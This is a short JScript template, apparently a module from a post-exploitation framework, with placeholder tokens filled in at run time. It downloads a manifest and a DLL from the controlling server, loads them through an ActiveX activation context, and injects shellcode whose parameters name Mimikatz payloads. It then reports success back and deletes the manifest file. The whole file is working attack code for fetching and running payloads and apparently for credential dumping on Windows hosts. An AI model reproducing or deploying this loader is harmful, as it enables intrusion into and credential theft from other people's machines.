try
{
    var manifestPath = proton.file.getPath("~DIRECTORY~\\TashLib.manifest");
    proton.http.download(manifestPath, "~MANIFESTUUID~");

    proton.http.download("~DIRECTORY~\\TashLib.dll", "~DLLUUID~");

    var actCtx = new ActiveXObject( "Microsoft.Windows.ActCtx" );
    actCtx.Manifest = manifestPath;
    var tash =  actCtx.CreateObject("TashLib.TashLoader");

    var shim_lpParam = "~MIMICMD~~~~UUIDHEADER~~~~SHIMX64UUID~~~~MIMIX86UUID~~~~MIMIX64UUID~~~" + proton.work.make_url();

    // TSC = "\x..."
    ~SHIMX86BYTES~

    var res = tash.Load(TSC, shim_lpParam, ~SHIMX86OFFSET~);

    proton.work.report("Success");
}
catch (e)
{
    proton.work.error(e);
}

proton.file.deleteFile(manifestPath);
proton.exit();
